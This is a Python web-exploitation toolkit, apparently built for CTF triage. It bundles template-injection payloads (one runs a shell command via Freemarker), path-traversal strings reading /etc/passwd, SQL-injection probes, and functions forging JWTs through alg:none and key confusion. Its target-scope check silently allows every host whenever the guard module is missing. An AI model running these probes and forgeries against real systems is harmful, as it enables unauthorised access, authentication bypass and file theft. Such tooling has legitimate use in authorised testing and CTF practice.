"""
web_toolkit.py - Comprehensive Web Exploitation & Probe Suite.

Features:
  - SSTI Polyglot & Engine Fingerprinter (Jinja2, Twig, Freemarker, Ruby ERB/Velocity)
  - JWT Analyzer & Exploit Generator (alg:none, HS256/RS256 key confusion, blank secrets)
  - LFI / Path Traversal Prober (traversal + wrapper filters like php://filter)
  - SQLi Heuristic Probe & Blind Boolean/Timing detection
  - Scoped request dispatcher enforcing scope.yaml target boundaries
"""

import os
import sys
import json
import base64
import hmac
import hashlib
import requests
from urllib.parse import urljoin, parse_qs, urlencode, urlsplit, urlunsplit
from typing import Dict, List, Optional, Tuple, Any

# Target scope validator
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
try:
    from scope_guard import validate_target
except ImportError:
    validate_target = lambda h, p: True

# SSTI Payloads & Markers
SSTI_PAYLOADS = [
    # Jinja2 / Python
    {"engine": "Jinja2", "payload": "{{7*'7'}}", "expected": "7777777"},
    {"engine": "Jinja2/Twig", "payload": "{{7*7}}", "expected": "49"},
    {"engine": "Twig", "payload": "{{7*'7'}}", "expected": "49"},
    # Freemarker / Java
    {"engine": "Freemarker", "payload": "${7*7}", "expected": "49"},
    {"engine": "Freemarker-Exec", "payload": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", "expected": "uid="},
    # Ruby / ERB
    {"engine": "Ruby ERB", "payload": "<%= 7*7 %>", "expected": "49"},
    # Node / Dust / Pug / EJS
    {"engine": "EJS", "payload": "<%= 7*7 %>", "expected": "49"},
    {"engine": "Spring/Velocity", "payload": "${7*7}", "expected": "49"}
]

# LFI Payloads
LFI_PAYLOADS = [
    "../../../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "/etc/passwd",
    "../../../../../../../../windows/win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/convert.base64-encode/resource=flag.php"
]

# SQLi Probes
SQLI_HEURISTIC_PAYLOADS = [
    "'",
    "''",
    "\"\"",
    "' OR '1'='1",
    "' OR 1=1-- -",
    "' UNION SELECT NULL-- -",
    "admin' --",
    "admin' #"
]


class ScopedWebSession:
    """Safe wrapper over requests.Session enforcing scope boundaries."""
    def __init__(self, timeout: float = 10.0):
        self.session = requests.Session()
        self.timeout = timeout
        self.session.headers.update({
            "User-Agent": "CTF-Triage-Bot/2.0"
        })

    def _validate_url(self, url: str):
        parsed = urlsplit(url)
        host = parsed.hostname or "127.0.0.1"
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        validate_target(host, port)

    def get(self, url: str, **kwargs):
        self._validate_url(url)
        kwargs.setdefault("timeout", self.timeout)
        return self.session.get(url, **kwargs)

    def post(self, url: str, **kwargs):
        self._validate_url(url)
        kwargs.setdefault("timeout", self.timeout)
        return self.session.post(url, **kwargs)


def probe_ssti(url: str, param: str, method: str = "GET", session: Optional[ScopedWebSession] = None) -> List[Dict[str, str]]:
    """Probe an endpoint parameter for Server-Side Template Injection."""
    if session is None:
        session = ScopedWebSession()
        
    findings = []
    for test in SSTI_PAYLOADS:
        try:
            if method.upper() == "GET":
                res = session.get(url, params={param: test["payload"]})
            else:
                res = session.post(url, data={param: test["payload"]})
                
            if test["expected"] in res.text:
                findings.append({
                    "engine": test["engine"],
                    "payload": test["payload"],
                    "matched": test["expected"],
                    "param": param
                })
        except Exception:
            continue
    return findings


def probe_lfi(url: str, param: str, session: Optional[ScopedWebSession] = None) -> List[Dict[str, str]]:
    """Probe an endpoint parameter for Local File Inclusion / Traversal."""
    if session is None:
        session = ScopedWebSession()
        
    findings = []
    for payload in LFI_PAYLOADS:
        try:
            res = session.get(url, params={param: payload})
            # Check for root/passwd indicators or base64 streams
            if "root:x:0:0:" in res.text or "[fonts]" in res.text.lower() or "PD9waHA" in res.text:
                findings.append({
                    "type": "LFI/Traversal",
                    "payload": payload,
                    "param": param,
                    "snippet": res.text[:200]
                })
        except Exception:
            continue
    return findings


# --- JWT Exploitation Primitives ---

def decode_jwt(token: str) -> Tuple[Dict, Dict, bytes]:
    """Decode JWT header, payload, and signature without verification."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Invalid JWT token structure")
    
    def b64url_decode(s: str) -> bytes:
        pad = len(s) % 4
        if pad > 0:
            s += "=" * (4 - pad)
        return base64.urlsafe_b64decode(s)

    header = json.loads(b64url_decode(parts[0]).decode('utf-8'))
    payload = json.loads(b64url_decode(parts[1]).decode('utf-8'))
    sig = b64url_decode(parts[2])
    return header, payload, sig


def forge_jwt_alg_none(header: Dict, payload: Dict) -> str:
    """Forge JWT token with alg: none / None / NONE bypass."""
    def b64url_encode(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).decode('ascii').rstrip("=")

    header_mod = dict(header)
    header_mod["alg"] = "none"
    
    h_b64 = b64url_encode(json.dumps(header_mod, separators=(',', ':')).encode('utf-8'))
    p_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
    return f"{h_b64}.{p_b64}."


def forge_jwt_key_confusion(header: Dict, payload: Dict, public_key_pem: str) -> str:
    """HMAC-SHA256 forge using the server's public key as an HMAC secret (CVE-2015-9235 / key confusion)."""
    def b64url_encode(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).decode('ascii').rstrip("=")

    header_mod = dict(header)
    header_mod["alg"] = "HS256"
    
    h_b64 = b64url_encode(json.dumps(header_mod, separators=(',', ':')).encode('utf-8'))
    p_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
    signing_input = f"{h_b64}.{p_b64}".encode('ascii')
    
    sig = hmac.new(public_key_pem.encode('utf-8'), signing_input, hashlib.sha256).digest()
    sig_b64 = b64url_encode(sig)
    return f"{h_b64}.{p_b64}.{sig_b64}"
